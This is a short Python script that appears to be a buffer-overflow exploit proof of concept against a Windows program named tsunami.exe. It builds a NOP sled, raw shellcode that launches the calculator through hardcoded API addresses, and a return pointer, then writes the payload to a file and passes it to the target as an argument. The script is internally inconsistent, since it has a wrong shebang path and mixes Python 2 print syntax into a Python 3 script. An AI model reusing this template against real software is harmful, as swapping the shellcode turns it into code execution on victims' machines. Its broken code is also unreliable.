#!/bin/usr/python3
import sys, subprocess

code = b"\x90" * 24  # NOOP slope
code += b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\xb8\xad\x23\x86\x7c\xff\xd0\xb8\xfa\xca\x81\x7c\xff\xd0" # proper shellcode
code += b"\x90" * 9 # more slope
code += b"\x4c\xff\x12" # [ BUFFER PTR in previous analysis ! ]

bin_path = "payload.bin"

print code
try:
    with open(bin_path, "wb") as f:
        f.write(code)
except Exception as e:
    print("Caught exception: ",e)

subprocess.call(['tsunami.exe', code])
